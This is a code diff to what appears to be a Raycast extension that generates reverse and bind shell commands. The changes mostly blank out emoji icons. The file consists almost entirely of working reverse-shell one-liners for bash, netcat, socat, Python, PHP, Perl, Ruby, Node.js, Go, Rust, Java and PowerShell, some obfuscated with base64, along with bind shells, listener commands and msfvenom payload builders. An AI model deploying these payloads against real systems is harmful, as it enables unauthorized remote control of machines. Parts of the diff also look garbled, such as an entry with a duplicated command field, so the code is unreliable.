@@ -1,4 +1,4 @@
-import { ActionPanel, Action, Form, List, useNavigation, showToast, Toast, Icon, LocalStorage } from "@raycast/api";
+import { ActionPanel, Action, Form, List, useNavigation, showToast, Toast, Icon, preferences } from "@raycast/api";
 import { useState, useEffect } from "react";
 import { writeFile } from "fs/promises";
 import { homedir } from "os";
@@ -11,6 +11,7 @@ import {
   base64Encode,
   groupBySubcategory,
   getOSTagColor,
+  getDeviconUrl,
   type ShellTemplate,
 } from "./utils";
 
@@ -19,6 +20,11 @@ import {
 // ============================================================================
 
 interface Config {
+  ip: string;
+  port: string;
+}
+
+interface FormValues {
   ip: string;
   port: string;
 }
@@ -32,7 +38,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "bash-tcp",
     name: "Bash TCP",
-    icon: "🐚",
+    icon: "",
     command: "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1",
     description: "Bash reverse shell using /dev/tcp",
     category: "reverse",
@@ -44,7 +50,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "bash-exec",
     name: "Bash Exec",
-    icon: "🐚",
+    icon: "",
     command: 'bash -c "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1"',
     description: "Reverse shell executed with bash -c",
     category: "reverse",
@@ -56,7 +62,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "bash-196",
     name: "Bash 196",
-    icon: "🐚",
+    icon: "",
     command: "0<&196;exec 196<>/dev/tcp/{IP}/{PORT}; sh <&196 >&196 2>&196",
     description: "Bash shell using file descriptor 196",
     category: "reverse",
@@ -68,7 +74,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "bash-udp",
     name: "Bash UDP",
-    icon: "🐚",
+    icon: "",
     command: "sh -i >& /dev/udp/{IP}/{PORT} 0>&1",
     description: "Bash shell using UDP",
     category: "reverse",
@@ -80,7 +86,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "bash-read-line",
     name: "Bash Read Line",
-    icon: "🐚",
+    icon: "",
     command: "exec 5<>/dev/tcp/{IP}/{PORT};cat <&5 | while read line; do $line 2>&5 >&5; done",
     description: "Bash read line reverse shell",
     category: "reverse",
@@ -92,7 +98,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "bash-5",
     name: "Bash 5",
-    icon: "🐚",
+    icon: "",
     command: "/bin/bash -i >& /dev/tcp/{IP}/{PORT} 0>&1",
     description: "Bash 5 reverse shell",
     category: "reverse",
@@ -104,7 +110,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "zsh",
     name: "Zsh",
-    icon: "🐚",
+    icon: "",
     command: "zsh -i >& /dev/tcp/{IP}/{PORT} 0>&1",
     description: "Zsh reverse shell",
     category: "reverse",
@@ -116,7 +122,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "nc-busybox",
     name: "BusyBox nc",
-    icon: "📦",
+    icon: "",
     command: "busybox nc {IP} {PORT} -e /bin/sh",
     description: "BusyBox netcat reverse shell",
     category: "reverse",
@@ -128,7 +134,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "nc-exe",
     name: "nc.exe",
-    icon: "📦",
+    icon: "",
     command: "nc.exe -e cmd.exe {IP} {PORT}",
     description: "Windows netcat reverse shell",
     category: "reverse",
@@ -140,7 +146,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "ncat-exe",
     name: "ncat.exe",
-    icon: "📦",
+    icon: "",
     command: "ncat.exe {IP} {PORT} -e cmd.exe",
     description: "Windows ncat reverse shell",
     category: "reverse",
@@ -152,7 +158,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "ncat-udp",
     name: "Ncat UDP",
-    icon: "📦",
+    icon: "",
     command: "ncat --udp {IP} {PORT} -e /bin/sh",
     description: "Ncat UDP reverse shell",
     category: "reverse",
@@ -164,7 +170,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "nc-standard",
     name: "Netcat (Standard)",
-    icon: "🔌",
+    icon: "",
     command: "nc -e /bin/bash {IP} {PORT}",
     description: "Standard Netcat reverse shell",
     category: "reverse",
@@ -176,7 +182,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "nc-fifo",
     name: "Netcat (FIFO)",
-    icon: "🔌",
+    icon: "",
     command: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f",
     description: "Netcat variant using FIFO pipe",
     category: "reverse",
@@ -188,7 +194,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "nc-openbsd",
     name: "Netcat (OpenBSD)",
-    icon: "🔌",
+    icon: "",
     command: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {IP} {PORT} >/tmp/f",
     description: "OpenBSD Netcat reverse shell",
     category: "reverse",
@@ -200,7 +206,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "ncat",
     name: "Ncat",
-    icon: "🔌",
+    icon: "",
     command: "ncat {IP} {PORT} -e /bin/bash",
     description: "Ncat tool from Nmap",
     category: "reverse",
@@ -211,7 +217,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "socat",
     name: "Socat",
-    icon: "🔗",
+    icon: "",
     command: "socat tcp-connect:{IP}:{PORT} exec:/bin/sh,pty,stderr,setsid,sigint,sane",
     description: "Socat TCP connection reverse shell",
     category: "reverse",
@@ -223,16 +229,20 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "sqlite3-nc",
     name: "SQLite3 nc",
-    icon: "🗃️",
+    icon: "",
     command: "sqlite3 :memory: -cmd '.shell nc {IP} {PORT} -e /bin/sh'",
-    command:
-      "runhaskell -e 'import Network;import System.Process;import Control.Monad(forever);main=withSocketsDo$do s<-connectTo\"{IP}\"(PortNumber {PORT});hSetBuffering s NoBuffering;forever$do hPutStrLn s=<<getLine;hGetLine s>>=putStrLn'",
+    description: "SQLite3 netcat reverse shell",
+    category: "reverse",
+    subcategory: "Shell Tools",
+    os: ["linux"],
+    listener: `nc -lvnp {PORT}
+# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
   },
 
   {
     type: "socat-tty",
     name: "Socat (TTY)",
-    icon: "🔌",
+    icon: "",
     command: "socat EXEC:'bash -li',pty,stderr,setsid,sigint,sane tcp:{IP}:{PORT}",
     description: "Socat reverse shell with TTY",
     category: "reverse",
@@ -244,7 +254,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "haskell",
     name: "Haskell",
-    icon: "λ",
+    icon: "",
     command:
       "runhaskell -e 'import Network;import System.Process;main=withSocketsDo$do s<-connectTo\"{IP}\"(PortNumber {PORT});hSetBuffering s NoBuffering;forever$do hPutStrLn s=<<getLine;hGetLine s>>=putStrLn'",
     description: "Haskell reverse shell",
@@ -257,7 +267,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "telnet",
     name: "Telnet",
-    icon: "📞",
+    icon: "",
     command: "TF=$(mktemp -u);mkfifo $TF && telnet {IP} {PORT} 0<$TF | /bin/sh 1>$TF",
     description: "Telnet reverse shell",
     category: "reverse",
@@ -271,7 +281,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "python2",
     name: "Python 2",
-    icon: "🐍",
+    icon: "",
     command:
       'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
     description: "Python 2 socket reverse shell",
@@ -284,7 +294,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "python3",
     name: "Python 3",
-    icon: "🐍",
+    icon: "",
     command:
       'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
     description: "Python 3 socket reverse shell",
@@ -297,7 +307,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "python-shortest",
     name: "Python (Shortest)",
-    icon: "🐍",
+    icon: "",
     command:
       'python -c \'import os,pty,socket;s=socket.socket();s.connect(("{IP}",{PORT}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")\'',
     description: "Shortest Python reverse shell",
@@ -310,7 +320,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "python-windows",
     name: "Python (Windows)",
-    icon: "🐍",
+    icon: "",
     command:
       'python -c \'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));subprocess.call(["cmd.exe"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\'',
     description: "Windows Python reverse shell",
@@ -323,7 +333,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "php-exec",
     name: "PHP (exec)",
-    icon: "🐘",
+    icon: "",
     command: 'php -r \'$sock=fsockopen("{IP}",{PORT});exec("/bin/sh -i <&3 >&3 2>&3");\'',
     description: "PHP exec reverse shell",
     category: "reverse",
@@ -335,7 +345,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "php-system",
     name: "PHP (system)",
-    icon: "🐘",
+    icon: "",
     command: 'php -r \'$sock=fsockopen("{IP}",{PORT});system("/bin/sh -i <&3 >&3 2>&3");\'',
     description: "PHP system reverse shell",
     category: "reverse",
@@ -347,7 +357,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "php-passthru",
     name: "PHP (passthru)",
-    icon: "🐘",
+    icon: "",
     command: 'php -r \'$sock=fsockopen("{IP}",{PORT});passthru("/bin/sh -i <&3 >&3 2>&3");\'',
     description: "PHP passthru reverse shell",
     category: "reverse",
@@ -359,7 +369,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "php-shell_exec",
     name: "PHP (shell_exec)",
-    icon: "🐘",
+    icon: "",
     command: 'php -r \'$sock=fsockopen("{IP}",{PORT});shell_exec("/bin/sh -i <&3 >&3 2>&3");\'',
     description: "PHP shell_exec reverse shell",
     category: "reverse",
@@ -372,7 +382,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "php-ivan",
     name: "PHP (Ivan)",
-    icon: "🐘",
+    icon: "",
     command: 'php -r \'$s=fsockopen("{IP}",{PORT});exec("/bin/sh");\'',
     description: "Ivan PHP reverse shell",
     category: "reverse",
@@ -384,7 +394,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "php-pentestmonkey",
     name: "PHP (PentestMonkey)",
-    icon: "🐘",
+    icon: "",
     command: 'php -r \'$sock=fsockopen("{IP}",{PORT});exec("/bin/sh -i <&3 >&3 2>&3");\'',
     description: "PentestMonkey PHP reverse shell",
     category: "reverse",
@@ -396,7 +406,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "perl-no-sh",
     name: "Perl (no sh)",
-    icon: "🐪",
+    icon: "",
     command:
       "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{IP}:{PORT}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
     description: "Perl reverse shell without /bin/sh",
@@ -410,7 +420,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "perl-pm",
     name: "Perl (PentestMonkey)",
-    icon: "🐪",
+    icon: "",
     command:
       'perl -e \'use Socket;$i="{IP}";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));\'',
     description: "PentestMonkey Perl reverse shell",
@@ -423,7 +433,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "ruby-no-sh",
     name: "Ruby (no sh)",
-    icon: "💎",
+    icon: "",
     command:
       'ruby -rsocket -e \'c=TCPSocket.new("{IP}",{PORT});while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\'',
     description: "Ruby reverse shell without /bin/sh",
@@ -436,7 +446,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "perl",
     name: "Perl",
-    icon: "🐪",
+    icon: "",
     command:
       'perl -e \'use Socket;$i="{IP}";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i")};\'',
     description: "Perl socket reverse shell",
@@ -449,7 +459,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "ruby",
     name: "Ruby",
-    icon: "💎",
+    icon: "",
     command:
       'ruby -rsocket -e\'f=TCPSocket.open("{IP}",{PORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
     description: "Ruby TCPSocket reverse shell",
@@ -462,7 +472,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "nodejs",
     name: "Node.js",
-    icon: "🟢",
+    icon: "",
     command:
       'node -e \'(function(){var net = require("net"),cp = require("child_process"),sh = cp.spawn("/bin/sh", []);var client = new net.Socket();client.connect({PORT}, "{IP}", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();\'',
     description: "Node.js net module reverse shell",
@@ -476,7 +486,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "nodejs-2",
     name: "Node.js #2",
-    icon: "🟢",
+    icon: "",
     command: "require('child_process').exec('nc -e /bin/sh {IP} {PORT}')",
     description: "Node.js reverse shell via nc",
     category: "reverse",
@@ -488,7 +498,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "lua-2",
     name: "Lua #2",
-    icon: "🌙",
+    icon: "",
     command:
       'lua5.1 -e \'local s=require("socket");local t=assert(s.tcp());t:connect("{IP}",{PORT});while true do local r=t:receive();local f=assert(io.popen(r,"r"));t:send(f:read("*a"));end\'',
     description: "Lua reverse shell variant",
@@ -501,7 +511,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "python-2-var",
     name: "Python #2",
-    icon: "🐍",
+    icon: "",
     command:
       'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
     description: "Python reverse shell variant",
@@ -516,7 +526,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "golang",
     name: "Golang",
-    icon: "🔷",
+    icon: "",
     command:
       'echo \'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","{IP}:{PORT}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go',
     description: "Golang reverse shell",
@@ -529,7 +539,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "rust",
     name: "Rust",
-    icon: "🦀",
+    icon: "",
     command:
       'echo \'use std::net::TcpStream;use std::os::unix::io::{AsRawFd, FromRawFd};use std::process::{Command, Stdio};fn main(){let s=TcpStream::connect("{IP}:{PORT}").unwrap();let fd=s.as_raw_fd();Command::new("/bin/sh").arg("-i").stdin(unsafe{Stdio::from_raw_fd(fd)}).stdout(unsafe{Stdio::from_raw_fd(fd)}).stderr(unsafe{Stdio::from_raw_fd(fd)}).spawn().unwrap().wait().unwrap();}\' > /tmp/t.rs && rustc /tmp/t.rs -o /tmp/t && /tmp/t && rm /tmp/t /tmp/t.rs',
     description: "Rust reverse shell",
@@ -543,7 +553,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "crystal",
     name: "Crystal",
-    icon: "💎",
+    icon: "",
     command: 'crystal eval "require \'socket\';c=TCPSocket.new(\\"{IP}\\",{PORT});"',
     description: "Crystal reverse shell",
     category: "reverse",
@@ -555,7 +565,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "dart",
     name: "Dart",
-    icon: "🎯",
+    icon: "",
     command: "dart -e \"import 'dart:io';Socket.connect('{IP}',{PORT});\"",
     description: "Dart reverse shell",
     category: "reverse",
@@ -567,7 +577,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "java",
     name: "Java",
-    icon: "☕",
+    icon: "",
     command:
       'echo \'import java.net.*;import java.io.*;public class shell{public static void main(String[]a)throws Exception{Socket s=new Socket("{IP}",{PORT});InputStream i=s.getInputStream();OutputStream o=s.getOutputStream();Process p=new ProcessBuilder("/bin/sh").redirectErrorStream(true).start();InputStream pi=p.getInputStream(),pe=p.getErrorStream();OutputStream po=p.getOutputStream();byte[]b=new byte[1024];while(true){int r;i.available()>0?(r=i.read(b)):pi.available()>0?(r=pi.read(b)):(Thread.sleep(50),continue);if(r==-1)break;o.write(b,0,r);po.write(b,0,r);o.flush();po.flush();}s.close();p.destroy();}}\' > /tmp/shell.java && javac /tmp/shell.java && java -cp /tmp shell && rm /tmp/shell.java /tmp/shell.class',
     description: "Java Socket reverse shell (compiles and runs)",
@@ -581,7 +591,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "java-2",
     name: "Java #2",
-    icon: "☕",
+    icon: "",
     command:
       'echo \'class R{public static void main(String[]a)throws Exception{java.net.Socket s=new java.net.Socket("{IP}",{PORT});Process p=Runtime.getRuntime().exec("/bin/sh");new Thread(()->{try{var is=s.getInputStream();var os=p.getOutputStream();int b;while((b=is.read())!=-1)os.write(b);}catch(Exception e){}}).start();var os=s.getOutputStream();var is=p.getInputStream();int b;while((b=is.read())!=-1)os.write(b);}}\' > /tmp/R.java && javac /tmp/R.java && java -cp /tmp R',
     description: "Java reverse shell variant 2",
@@ -594,7 +604,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "java-3",
     name: "Java #3",
-    icon: "☕",
+    icon: "",
     command:
       'echo \'class X{public static void main(String[]a)throws Exception{Process p=Runtime.getRuntime().exec("/bin/sh");java.net.Socket x=new java.net.Socket("{IP}",{PORT});var is=x.getInputStream();var pi=p.getInputStream();var os=x.getOutputStream();var po=p.getOutputStream();while(!x.isClosed()){while(pi.available()>0)os.write(pi.read());while(is.available()>0)po.write(is.read());os.flush();po.flush();Thread.sleep(50);}p.destroy();x.close();}}\' > /tmp/X.java && javac /tmp/X.java && java -cp /tmp X',
     description: "Java reverse shell variant 3",
@@ -609,7 +619,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "powershell-1",
     name: "PowerShell #1",
-    icon: "⚡",
+    icon: "",
     command:
       'powershell -NoP -NonI -W Hidden -Exec Bypass -Command $client = New-Object System.Net.Sockets.TCPClient("{IP}",{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()',
     description: "Windows PowerShell reverse shell #1",
@@ -622,7 +632,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "powershell-2",
     name: "PowerShell #2",
-    icon: "⚡",
+    icon: "",
     command:
       "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{IP}',{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
     description: "Windows PowerShell reverse shell #2",
@@ -635,7 +645,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "powershell-base64",
     name: "PowerShell (Base64)",
-    icon: "⚡",
+    icon: "",
     command:
       "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAewBJAFAAfQAiACwAewBQAE8AUgBUAH0AKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwAGUAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA",
     description: "Base64 encoded PowerShell shell",
@@ -649,7 +659,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "powershell-3",
     name: "PowerShell #3",
-    icon: "⚡",
+    icon: "",
     command:
       "powershell -nop -c \"$c=New-Object System.Net.Sockets.TCPClient('{IP}',{PORT});$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.UTF8Encoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r+=[char]13+[char]10;$s.Write([byte[]]([Text.UTF8Encoding]::UTF8.GetBytes($r)),0,$r.Length)}$c.Close()\"",
     description: "PowerShell reverse shell #3",
@@ -662,7 +672,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "powershell-4-tls",
     name: "PowerShell #4 (TLS)",
-    icon: "⚡",
+    icon: "",
     command:
       "powershell -nop -c \"$c=New-Object System.Net.Sockets.TCPClient('{IP}',{PORT});$s=$c.GetStream();$ssl=New-Object System.Net.Security.SslStream($s);$ssl.AuthenticateAsClient('{IP}');[byte[]]$b=0..65535|%%{0};while(($i=$ssl.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.UTF8Encoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$ssl.Write([byte[]]([Text.UTF8Encoding]::UTF8.GetBytes($r)),0,$r.Length)}$c.Close()\"",
     description: "PowerShell reverse shell with TLS",
@@ -674,7 +684,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "windows-conpty",
     name: "Windows ConPty",
-    icon: "🪟",
+    icon: "",
     command: "stty raw -echo; (stty size; cat) | nc -lvnp {PORT}",
     description: "Windows ConPty reverse shell",
     category: "reverse",
@@ -686,7 +696,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "csharp",
     name: "C# TCP Client",
-    icon: "🔷",
+    icon: "",
     command:
       'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=\'using System;using System.IO;using System.Net;using System.Net.Sockets;using System.Diagnostics;class P{static StreamWriter w;static void Main(){using(var c=new TcpClient(\\"{IP}\\",{PORT})){var s=c.GetStream();w=new StreamWriter(s);var r=new StreamReader(s);var p=new Process();p.StartInfo.FileName=\\"cmd.exe\\";p.StartInfo.CreateNoWindow=true;p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardInput=true;p.StartInfo.RedirectStandardOutput=true;p.StartInfo.RedirectStandardError=true;p.OutputDataReceived+=(x,e)=>{try{w.WriteLine(e.Data);w.Flush();}catch{}};p.Start();p.BeginOutputReadLine();while(true){var l=r.ReadLine();p.StandardInput.WriteLine(l);}}}}\'; Add-Type -TypeDefinition $c -Language CSharp; [P]::Main()"',
     description: "C# TCP Client reverse shell (PowerShell compile-in-memory)",
@@ -701,7 +711,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "bind-nc",
     name: "Netcat Bind",
-    icon: "🔗",
+    icon: "",
     command: "nc -lvp {PORT} -e /bin/sh",
     description: "Netcat bind shell (Linux)",
     category: "bind",
@@ -712,7 +722,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "bind-nc-windows",
     name: "Netcat Bind (Windows)",
-    icon: "🔗",
+    icon: "",
     command: "nc.exe -lvp {PORT} -e cmd.exe",
     description: "Netcat bind shell (Windows)",
     category: "bind",
@@ -723,7 +733,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "bind-socat",
     name: "Socat Bind",
-    icon: "🔌",
+    icon: "",
     command: "socat TCP-LISTEN:{PORT},fork EXEC:/bin/sh",
     description: "Socat bind shell",
     category: "bind",
@@ -734,7 +744,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "bind-python",
     name: "Python Bind",
-    icon: "🐍",
+    icon: "",
     command:
       'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",{PORT}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
     description: "Python bind shell",
@@ -748,7 +758,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "lua",
     name: "Lua",
-    icon: "🌙",
+    icon: "",
     command:
       "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{IP}','{PORT}');os.execute('/bin/sh -i <&3 >&3 2>&3');\"",
     description: "Lua socket reverse shell",
@@ -761,7 +771,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "openssl-rev",
     name: "OpenSSL",
-    icon: "🔐",
+    icon: "",
     command:
       "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {IP}:{PORT} > /tmp/s; rm /tmp/s",
     description: "OpenSSL encrypted reverse shell",
@@ -774,7 +784,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "awk-rev",
     name: "Awk",
-    icon: "📊",
+    icon: "",
     command:
       'awk \'BEGIN {s = "/inet/tcp/0/{IP}/{PORT}"; while(42) { do{ printf "shell> " |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\'',
     description: "Awk reverse shell",
@@ -787,7 +797,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "curl-rev",
     name: "Curl",
-    icon: "🌐",
+    icon: "",
     command: "curl {IP}:{PORT} | sh",
     description: "Curl reverse shell (requires listener to serve shell script)",
     category: "reverse",
@@ -800,7 +810,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "msfvenom-linux-x64",
     name: "MSFVenom Linux x64",
-    icon: "🎯",
+    icon: "",
     command: "msfvenom -p linux/x64/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f elf > shell.elf",
     description: "MSFVenom Linux x64 ELF reverse shell",
     category: "msfvenom",
@@ -812,7 +822,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "msfvenom-linux-x86",
     name: "MSFVenom Linux x86",
-    icon: "🎯",
+    icon: "",
     command: "msfvenom -p linux/x86/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f elf > shell.elf",
     description: "MSFVenom Linux x86 ELF reverse shell",
     category: "msfvenom",
@@ -824,7 +834,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
